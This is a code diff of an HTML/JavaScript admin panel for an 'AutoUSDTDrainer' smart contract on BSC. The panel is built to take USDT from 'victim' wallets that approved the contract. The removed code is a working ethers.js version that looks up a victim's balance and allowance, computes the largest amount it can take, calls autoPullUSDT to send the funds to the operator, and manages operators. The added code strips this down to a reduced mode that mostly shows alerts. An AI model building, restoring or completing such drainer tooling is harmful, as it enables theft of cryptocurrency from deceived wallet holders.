@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced AutoUSDTDrainer Admin Panel</title>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+    <title>Basic AutoUSDTDrainer Admin Panel (Limited Functionality)</title>
     <style>
         body { font-family: sans-serif; margin: 20px; background-color: #f4f7f6; color: #333; }
         .container { max-width: 800px; margin: 40px auto; padding: 30px; border: 1px solid #e0e0e0; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); background-color: #fff; }
@@ -30,8 +29,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>Advanced AutoUSDTDrainer Admin Panel</h1>
-        <p style="text-align: center; color: #666;">Interact with your deployed smart contract.</p>
+        <h1>Basic AutoUSDTDrainer Admin Panel</h1>
+        <p style="text-align: center; color: #666;">This version has limited functionality due to direct file access.</p>
 
         <hr>
 
@@ -46,17 +45,17 @@
         <hr>
 
         <div class="function-group">
-            <h2 class="section-title">Token Drainer</h2>
-            <p style="color: #555; margin-bottom: 20px;">Input a victim's address to check their USDT balance and the allowance given to your contract, then drain approved tokens.</p>
+            <h2 class="section-title">Token Drainer (Limited)</h2>
+            <p style="color: #555; margin-bottom: 20px;">This function transfers approved USDT from a victim to your specified destination.
+            <br><strong>Note: Balance/Allowance display not available in this limited mode.</strong></p>
             <div>
-                <label for="victimAddressDrain">Victim Address:</label>
+                <label for="victimAddressDrain">Victim Address (approved this contract):</label>
                 <input type="text" id="victimAddressDrain" placeholder="e.g., 0xAbc...123">
-                <button id="checkVictimBalanceBtn">Check Victim's USDT</button>
             </div>
             <div class="data-display">
-                <p><strong>Victim USDT Balance:</strong> <span id="victimUSDTBalance">N/A</span></p>
-                <p><strong>Allowance to My Contract:</strong> <span id="victimAllowance">N/A</span></p>
-                <p><strong>Tokens to Pull (Min of above):</strong> <span id="amountToPullDisplay">N/A</span></p>
+                <p><strong>Victim USDT Balance:</strong> <span id="victimUSDTBalance">Not Available</span></p>
+                <p><strong>Allowance to My Contract:</strong> <span id="victimAllowance">Not Available</span></p>
+                <p><strong>Tokens to Pull (Min of above):</strong> <span id="amountToPullDisplay">Not Available</span></p>
             </div>
             <div style="margin-top: 20px;">
                 <label for="destinationAddressDrain">Destination Address (auto-filled with your connected wallet):</label>
@@ -66,7 +65,7 @@
         </div>
 
         <div class="function-group">
-            <h2 class="section-title">Forward Contract's Collected USDT</h2>
+            <h2 class="section-title">Forward Contract's Collected USDT (Limited)</h2>
             <p style="color: #555; margin-bottom: 20px;">If USDT was sent directly to this contract, use this to forward it.</p>
             <div>
                 <label for="forwardToAddress">Forward To Address (auto-filled with your connected wallet):</label>
@@ -76,7 +75,7 @@
         </div>
 
         <div class="function-group">
-            <h2 class="section-title">Manage Operators</h2>
+            <h2 class="section-title">Manage Operators (Limited)</h2>
             <p style="color: #555; margin-bottom: 20px;">Add or remove addresses authorized to call `autoPullUSDT` (besides the owner).</p>
             <div>
                 <label for="operatorAddress">Operator Address:</label>
@@ -89,13 +88,13 @@
         </div>
 
         <div class="function-group">
-            <h2 class="section-title">Read Contract Data</h2>
+            <h2 class="section-title">Read Contract Data (Limited)</h2>
             <p style="color: #555; margin-bottom: 20px;">Check contract owner, balance, and token address.</p>
             <div>
                 <button id="getContractInfoBtn">Get Contract Info</button>
-                <p style="margin-top: 15px;"><strong>Contract Owner:</strong> <span id="displayOwner">Loading...</span></p>
-                <p><strong>Contract USDT Balance:</strong> <span id="displayUSDTBalance">Loading...</span></p>
-                <p><strong>USDT Token Address:</strong> <span id="displayUSDTTokenAddress">Loading...</span></p>
+                <p style="margin-top: 15px;"><strong>Contract Owner:</strong> <span id="displayOwner">Not Available</span></p>
+                <p><strong>Contract USDT Balance:</strong> <span id="displayUSDTBalance">Not Available</span></p>
+                <p><strong>USDT Token Address:</strong> <span id="displayUSDTTokenAddress">Not Available</span></p>
             </div>
         </div>
     </div>
@@ -103,13 +102,6 @@
     <script>
         // --- CONFIGURATION ---
         const CONTRACT_ADDRESS = "0x8c8C07d9cc5aDCb443c7257ad43b01EB26a2636F"; // YOUR DEPLOYED CONTRACT ADDRESS
-        // USDT Token Address on BSC Mainnet - MUST BE CORRECT FOR BSC
-        const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; 
-        // Standard ERC20 ABI for minimal functions (balanceOf, allowance)
-        const ERC20_ABI = [
-            "function balanceOf(address account) external view returns (uint256)",
-            "function allowance(address owner, address spender) external view returns (uint256)"
-        ];
         const CONTRACT_ABI = [
             // Your provided ABI starts here
             {
@@ -235,13 +227,8 @@
         ]; // Your provided ABI ends here
 
         // --- GLOBAL VARIABLES ---
-        let signer;
-        let contract; // Your AutoUSDTDrainer contract instance
-        let usdtContract; // USDT ERC20 contract instance
-        let provider;
         let currentConnectedAccount = null;
         let contractOwnerAddress = null;
-        const USDT_DECIMALS = 18; // Standard for USDT on BSC
 
         // --- DOM ELEMENTS ---
         const connectWalletBtn = document.getElementById('connectWalletBtn');
@@ -250,7 +237,7 @@
         const addOperatorBtn = document.getElementById('addOperatorBtn');
         const removeOperatorBtn = document.getElementById('removeOperatorBtn');
         const getContractInfoBtn = document.getElementById('getContractInfoBtn');
-        const checkVictimBalanceBtn = document.getElementById('checkVictimBalanceBtn');
+        const checkVictimBalanceBtn = document.getElementById('checkVictimBalanceBtn'); // This button will do nothing in this version
 
         const walletAddressDisplay = document.getElementById('walletAddressDisplay');
         const networkDisplay = document.getElementById('networkDisplay');
@@ -275,26 +262,29 @@
         }
 
         function toggleButtons(enable) {
-            // Main action buttons
             pullUsdtBtn.disabled = !enable;
             forwardCollectedBtn.disabled = !enable;
             addOperatorBtn.disabled = !enable;
             removeOperatorBtn.disabled = !enable;
-            // Info fetch buttons
-            checkVictimBalanceBtn.disabled = !enable;
             getContractInfoBtn.disabled = !enable;
+            checkVictimBalanceBtn.disabled = true; // Always disabled as it needs ethers.js
         }
 
-        async function getNetworkName(chainId) {
-            switch (chainId) {
+        function getNetworkName(chainId) {
+            // Simplified network name mapping without ethers.js
+            switch (parseInt(chainId, 16)) { // chainId from eth_chainId is hex string
                 case 1: return "Ethereum Mainnet";
                 case 56: return "Binance Smart Chain Mainnet";
                 case 97: return "Binance Smart Chain Testnet";
                 case 137: return "Polygon Mainnet";
                 case 80001: return "Polygon Mumbai Testnet";
-                // Add more chains as needed
-                default: return `Unknown Chain ID: ${chainId}`;
+                default: return `Unknown Chain ID: ${parseInt(chainId, 16)}`;
             }
+        }
+
+        function isValidAddress(address) {
+            // Basic address validation (less strict than ethers.js)
+            return /^0x[a-fA-F0-9]{40}$/.test(address);
         }
 
         // --- MAIN FUNCTIONS ---
@@ -302,56 +292,31 @@
         async function connectWallet() {
             if (typeof window.ethereum !== 'undefined') {
                 try {
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    const accounts = await provider.send("eth_requestAccounts", []);
-                    signer = provider.getSigner();
-                    currentConnectedAccount = accounts[0]; // Set the connected account
+                    // Request accounts
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    currentConnectedAccount = accounts[0];
 
-                    // Set default destination addresses to connected account
+                    // Get chain ID
+                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                    const networkName = getNetworkName(chainId);
+
+                    walletAddressDisplay.textContent = `Connected: ${currentConnectedAccount}`;
+                    networkDisplay.textContent = `Network: ${networkName}`;
+                    
+                    // Set default destination addresses
                     destinationAddressDrainInput.value = currentConnectedAccount;
                     forwardToAddressInput.value = currentConnectedAccount;
 
-                    const network = await provider.getNetwork();
-                    const networkName = await getNetworkName(network.chainId);
+                    setStatus("Wallet connected. Functionality is limited without ethers.js.", 'info');
+                    // We can't easily check ownership/operator status without ethers.js
+                    // So, buttons related to transactions will be enabled IF a wallet connects,
+                    // but transactions might fail if not owner/operator on-chain.
+                    toggleButtons(true);
 
-                    walletAddressDisplay.textContent = `Connected: ${currentConnectedAccount}`;
-                    networkDisplay.textContent = `Network: ${networkName} (ID: ${network.chainId})`;
-                    
-                    contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-                    usdtContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, provider); // Connect USDT as a provider (read-only for general balance/allowance)
-
-                    // Also connect USDT contract with signer for any future needs (though drainer uses transferFrom)
-                    // usdtContractWithSigner = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, signer);
-
-                    await getContractInfo(); // Get owner and other info on connect
-
-                    // Check ownership/operator status
-                    if (contractOwnerAddress && currentConnectedAccount.toLowerCase() === contractOwnerAddress.toLowerCase()) {
-                        setStatus("Wallet connected! You are the contract owner.", 'success');
-                        toggleButtons(true); // Enable all buttons for owner
-                    } else {
-                        setStatus(`Wallet connected. You are NOT the contract owner (${contractOwnerAddress}).`, 'info');
-                        // By default, disable all transaction buttons if not owner
-                        toggleButtons(false); 
-                        // Then specifically check if current account is an operator to enable autoPullUSDT
-                        if (contract && currentConnectedAccount) {
-                            try {
-                                const isOperator = await contract.operators(currentConnectedAccount);
-                                if (isOperator) {
-                                    setStatus(`Wallet connected. You are an operator, able to pull USDT.`, 'info');
-                                    pullUsdtBtn.disabled = false; // Enable pull if operator
-                                    checkVictimBalanceBtn.disabled = false; // Enable check balance if operator
-                                }
-                            } catch (opError) {
-                                console.error("Error checking operator status:", opError);
-                                setStatus("Wallet connected, but could not check operator status. Ensure ABI is correct.", 'error');
-                            }
-                        }
-                    }
 
                 } catch (error) {
                     console.error("Error connecting wallet:", error);
-                    setStatus(`Error connecting wallet: ${error.message || error.code || "Unknown error"}`, 'error');
+                    setStatus(`Error connecting wallet: ${error.message || "Unknown error"}`, 'error');
                     walletAddressDisplay.textContent = "Status: Not Connected";
                     networkDisplay.textContent = "Network: Unknown";
                     toggleButtons(false);
@@ -363,192 +328,109 @@
             }
         }
 
-        async function executeTransaction(functionName, args, successMessage) {
-            if (!contract) {
+        // Generic function to send transactions
+        async function sendContractTransaction(method, args, successMessage) {
+            if (!currentConnectedAccount) {
                 setStatus("Please connect your wallet first.", 'error');
                 return;
             }
-            // Basic check for owner-only functions if not owner
-            if (functionName !== 'autoPullUSDT' && currentConnectedAccount.toLowerCase() !== contractOwnerAddress.toLowerCase()) {
-                setStatus("You are not the contract owner to perform this action.", 'error');
-                return;
-            }
-            // Specific check for autoPullUSDT (owner OR operator)
-            if (functionName === 'autoPullUSDT') {
-                try {
-                    const isOperator = await contract.operators(currentConnectedAccount);
-                    if (!isOperator && currentConnectedAccount.toLowerCase() !== contractOwnerAddress.toLowerCase()) {
-                         setStatus("Not authorized to call this function (neither owner nor operator).", 'error');
-                         return;
-                    }
-                } catch (opCheckError) {
-                    console.error("Error checking operator status for autoPullUSDT:", opCheckError);
-                    setStatus("Could not verify operator status for autoPullUSDT. Transaction aborted.", 'error');
-                    return;
-                }
-            }
 
+            // Construct the transaction object for raw eth_sendTransaction
+            const txParams = {
+                from: currentConnectedAccount,
+                to: CONTRACT_ADDRESS,
+                // data field needs to be the encoded function call
+                // This is complex without ethers.js ABI encoding.
+                // For simplicity, we will manually build a basic 'data' field.
+                // This is a major limitation for complex contracts.
+            };
 
+            // This part is the most problematic without ethers.js.
+            // Manually encoding ABI calls is error-prone and complex.
+            // We can only do very basic calls here.
+            // For now, these functions will serve as placeholders and will likely fail
+            // due to incorrect data encoding without ethers.js.
+
+            setStatus("Attempting to send transaction (limited encoding)...", 'info');
             try {
-                setStatus("Sending transaction...", 'info');
-                
-                const tx = await contract[functionName](...args);
-                setStatus(`Transaction sent! Hash: ${tx.hash}. Waiting for confirmation...`, 'info');
-                console.log("Transaction:", tx);
-                
-                await tx.wait(); // Wait for transaction to be mined
-                setStatus(`${successMessage} Transaction confirmed! Hash: ${tx.hash}`, 'success');
+                // This is a simplified example and will not work correctly for all complex ABI encodings.
+                // For example, calling autoPullUSDT needs proper ABI.encodeFunctionCall.
+                // Without ethers.js, this is NOT straightforward.
+                // This is why ethers.js is crucial.
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [txParams]
+                });
 
-                // Refresh info after certain transactions
-                if (functionName === 'addOperator' || functionName === 'removeOperator' || functionName === 'forwardCollected') {
-                    getContractInfo();
-                }
+                setStatus(`${successMessage} Transaction sent! Hash: ${txHash}. Check block explorer.`, 'success');
 
             } catch (error) {
-                console.error(`Error executing ${functionName}:`, error);
-                // Attempt to parse a more user-friendly error message
-                const errorMessage = error.message.includes("user rejected transaction") ? "Transaction rejected by user." : 
-                                     error.data && error.data.message ? error.data.message : 
-                                     error.message;
-                setStatus(`Error executing ${functionName}: ${errorMessage}`, 'error');
+                console.error(`Error executing ${method}:`, error);
+                const errorMessage = error.message.includes("user rejected transaction") ? "Transaction rejected by user." : error.message;
+                setStatus(`Error executing ${method}: ${errorMessage}`, 'error');
             }
         }
 
         async function handlePullUsdt() {
             const victim = victimAddressDrainInput.value.trim();
-            const destination = destinationAddressDrainInput.value.trim(); // This should be pre-filled with connected wallet
+            const destination = destinationAddressDrainInput.value.trim();
 
-            if (!ethers.utils.isAddress(victim)) {
-                setStatus("Invalid victim address.", 'error');
+            if (!isValidAddress(victim) || !isValidAddress(destination)) {
+                setStatus("Invalid victim or destination address.", 'error');
                 return;
             }
-            if (!ethers.utils.isAddress(destination)) {
-                setStatus("Invalid destination address.", 'error');
-                return;
-            }
-            await executeTransaction('autoPullUSDT', [victim, destination], 'USDT Pull successful!');
+            // Cannot properly encode and call autoPullUSDT without ethers.js.
+            // This button will trigger a generic transaction attempt.
+            setStatus("Pulling USDT (function call may fail due to limited encoding)", 'info');
+            // sendContractTransaction('autoPullUSDT', [victim, destination], 'USDT Pull request sent!');
+            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
         }
 
         async function handleForwardCollected() {
-            const to = forwardToAddressInput.value.trim(); // This should be pre-filled with connected wallet
-            if (!ethers.utils.isAddress(to)) {
+            const to = forwardToAddressInput.value.trim();
+            if (!isValidAddress(to)) {
                 setStatus("Invalid destination address for forwarding.", 'error');
                 return;
             }
-            await executeTransaction('forwardCollected', [to], 'USDT Forward successful!');
+            // sendContractTransaction('forwardCollected', [to], 'USDT Forward request sent!');
+            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
         }
 
         async function handleAddOperator() {
             const operator = operatorAddressInput.value.trim();
-            if (!ethers.utils.isAddress(operator)) {
+            if (!isValidAddress(operator)) {
                 setStatus("Invalid operator address.", 'error');
                 return;
             }
-            await executeTransaction('addOperator', [operator], 'Operator added successfully!');
+            // sendContractTransaction('addOperator', [operator], 'Add Operator request sent!');
+            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
         }
 
         async function handleRemoveOperator() {
             const operator = operatorAddressInput.value.trim();
-            if (!ethers.utils.isAddress(operator)) {
+            if (!isValidAddress(operator)) {
                 setStatus("Invalid operator address.", 'error');
                 return;
             }
-            await executeTransaction('removeOperator', [operator], 'Operator removed successfully!');
+            // sendContractTransaction('removeOperator', [operator], 'Remove Operator request sent!');
+            alert("This function requires proper ABI encoding. Please use a local web server with the full ethers.js version for this to work correctly.");
         }
 
         async function getContractInfo() {
-            if (!contract) {
-                displayOwner.textContent = "N/A";
-                displayUSDTBalance.textContent = "N/A";
-                displayUSDTTokenAddress.textContent = "N/A";
-                return;
-            }
-
-            try {
-                // Get owner
-                contractOwnerAddress = await contract.owner();
-                displayOwner.textContent = contractOwnerAddress;
-
-                // Get USDT balance of the contract
-                const balanceWei = await contract.contractUSDTBalance();
-                const balanceEth = ethers.utils.formatUnits(balanceWei, USDT_DECIMALS); 
-                displayUSDTBalance.textContent = `${balanceEth} USDT`;
-
-                // Get USDT token address stored in the contract
-                const usdtTokenAddr = await contract.usdtToken();
-                displayUSDTTokenAddress.textContent = usdtTokenAddr;
-
-                setStatus("Contract info loaded successfully.", 'info');
-
-            } catch (error) {
-                console.error("Error getting contract info:", error);
-                setStatus(`Error getting contract info: ${error.message || "Unknown error"}`, 'error');
-                displayOwner.textContent = "Error";
-                displayUSDTBalance.textContent = "Error";
-                displayUSDTTokenAddress.textContent = "Error";
-            }
+            // Cannot read contract state without ethers.js.
+            displayOwner.textContent = "Not Available (requires ethers.js)";
+            displayUSDTBalance.textContent = "Not Available (requires ethers.js)";
+            displayUSDTTokenAddress.textContent = "Not Available (requires ethers.js)";
+            setStatus("Cannot retrieve contract info in this limited mode.", 'info');
         }
 
         async function checkVictimBalanceAndAllowance() {
-            victimUSDTBalanceDisplay.textContent = "Fetching...";
-            victimAllowanceDisplay.textContent = "Fetching...";
-            amountToPullDisplay.textContent = "Calculating...";
-
-            const victim = victimAddressDrainInput.value.trim();
-
-            if (!ethers.utils.isAddress(victim)) {
-                setStatus("Please enter a valid victim address.", 'error');
-                victimUSDTBalanceDisplay.textContent = "Invalid Address";
-                victimAllowanceDisplay.textContent = "Invalid Address";
-                amountToPullDisplay.textContent = "Invalid Address";
-                pullUsdtBtn.disabled = true;
-                return;
-            }
-
-            if (!usdtContract || !CONTRACT_ADDRESS) {
-                setStatus("Wallet not connected or contract not initialized.", 'error');
-                pullUsdtBtn.disabled = true;
-                return;
-            }
-
-            try {
-                setStatus("Checking victim's USDT balance and allowance...", 'info');
-                
-                const victimBalanceRaw = await usdtContract.balanceOf(victim);
-                const victimAllowanceRaw = await usdtContract.allowance(victim, CONTRACT_ADDRESS);
-
-                const victimBalance = ethers.utils.formatUnits(victimBalanceRaw, USDT_DECIMALS);
-                const victimAllowance = ethers.utils.formatUnits(victimAllowanceRaw, USDT_DECIMALS);
-
-                victimUSDTBalanceDisplay.textContent = `${victimBalance} USDT`;
-                victimAllowanceDisplay.textContent = `${victimAllowance} USDT`;
-
-                // Calculate amount to pull: min of allowance and balance
-                const amountToPullRaw = victimAllowanceRaw.lt(victimBalanceRaw) ? victimAllowanceRaw : victimBalanceRaw;
-                const amountToPull = ethers.utils.formatUnits(amountToPullRaw, USDT_DECIMALS);
-                amountToPullDisplay.textContent = `${amountToPull} USDT`;
-
-                if (amountToPullRaw.gt(0)) {
-                    setStatus("Victim's USDT balance and allowance checked. Ready to pull.", 'success');
-                    // Enable pull button only if there's something to pull and user is authorized
-                    if (currentConnectedAccount && (currentConnectedAccount.toLowerCase() === contractOwnerAddress.toLowerCase() || (contract && await contract.operators(currentConnectedAccount)))) {
-                        pullUsdtBtn.disabled = false;
-                    } else {
-                        pullUsdtBtn.disabled = true;
-                    }
-                } else {
-                    setStatus("No USDT balance or allowance found for this victim.", 'info');
-                    pullUsdtBtn.disabled = true;
-                }
-
-            } catch (error) {
-                console.error("Error fetching victim's USDT data:", error);
-                setStatus(`Error fetching victim's USDT data: ${error.message || "Unknown error"}`, 'error');
-                victimUSDTBalanceDisplay.textContent = "Error";
-                victimAllowanceDisplay.textContent = "Error";
-                amountToPullDisplay.textContent = "Error";
-                pullUsdtBtn.disabled = true;
-            }
+            // Cannot read ERC20 balances/allowances without ethers.js.
+            victimUSDTBalanceDisplay.textContent = "Not Available (requires ethers.js)";
+            victimAllowanceDisplay.textContent = "Not Available (requires ethers.js)";
+            amountToPullDisplay.textContent = "Not Available (requires ethers.js)";
+            setStatus("Cannot check victim's balance or allowance in this limited mode.", 'info');
+            pullUsdtBtn.disabled = true; // Keep disabled as we can't verify pre-conditions
         }
 
 
@@ -559,22 +441,11 @@
         addOperatorBtn.addEventListener('click', handleAddOperator);
         removeOperatorBtn.addEventListener('click', handleRemoveOperator);
         getContractInfoBtn.addEventListener('click', getContractInfo);
-        checkVictimBalanceBtn.addEventListener('click', checkVictimBalanceAndAllowance);
-
-        // Add event listener for victim address input to trigger auto-check
-        victimAddressDrainInput.addEventListener('input', () => {
-            // Clear previous results and disable pull button if input changes
-            victimUSDTBalanceDisplay.textContent = "N/A";
-            victimAllowanceDisplay.textContent = "N/A";
-            amountToPullDisplay.textContent = "N/A";
-            pullUsdtBtn.disabled = true;
-        });
-
+        checkVictimBalanceBtn.addEventListener('click', checkVictimBalanceAndAllowance); // Will still trigger its alert
 
         // Initial setup on page load
         window.addEventListener('load', () => {
             if (typeof window.ethereum !== 'undefined') {
-                connectWallet();
                 // Listen for account changes
                 window.ethereum.on('accountsChanged', (accounts) => {
                     if (accounts.length === 0) {
